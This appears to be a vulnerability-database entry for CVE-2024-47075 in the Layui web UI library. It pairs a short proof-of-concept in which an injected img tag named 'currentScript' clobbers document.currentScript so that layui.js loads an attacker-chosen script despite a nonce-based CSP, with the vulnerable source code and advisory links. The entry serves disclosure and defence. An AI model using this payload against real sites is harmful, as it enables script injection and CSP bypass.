---
description: 一套遵循原生态开发模式的 Web UI 组件库，采用自身轻量级模块化规范，易上手，可以更简单快速地构建网页界面。
github: layui/layui
gadgets:
  ≤v2.9.16:
    cve: CVE-2024-47075
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [Layui](https://github.com/layui/layui) library was using the `document.currentScript` property to load additional scripts.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="/assets/libs/layui/2.9.16/layui.js"></script>
          <script nonce="secret">
            // Usage
            layui.use(function () {
              var layer = layui.layer;

              // Welcome
              layer.msg("Hello World", { icon: 6 });
            });
          </script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/layui/layui/blob/79bd6f502309c0c3e763b21a6cf293080b8a6cee/src/layui.js#L27">https://github.com/layui/layui/blob/79bd6f502309c0c3e763b21a6cf293080b8a6cee/src/layui.js#L27</a>

      ```javascript
      var doc = win.document;
      var config = {
        modules: {}, // 模块物理路径
        status: {}, // 模块加载状态
        timeout: 10, // 符合规范的模块请求最长等待秒数
        event: {} // 模块自定义事件
      };

      var Layui = function(){
        this.v = '2.9.16'; // Layui 版本号
      };

      // 识别预先可能定义的指定全局对象
      var GLOBAL = win.LAYUI_GLOBAL || {};

      // 获取 layui 所在目录
      var getPath = function(){
        var jsPath = doc.currentScript ? doc.currentScript.src : function(){
          var js = doc.scripts;
          var last = js.length - 1;
          var src;
          for(var i = last; i > 0; i--){
            if(js[i].readyState === 'interactive'){
              src = js[i].src;
              break;
            }
          }
          return src || js[last].src;
        }();

        return config.dir = GLOBAL.dir || jsPath.substring(0, jsPath.lastIndexOf('/') + 1);
      }();
      ```
    links:
      - https://github.com/advisories/GHSA-j827-6rgf-9629
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/layui.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
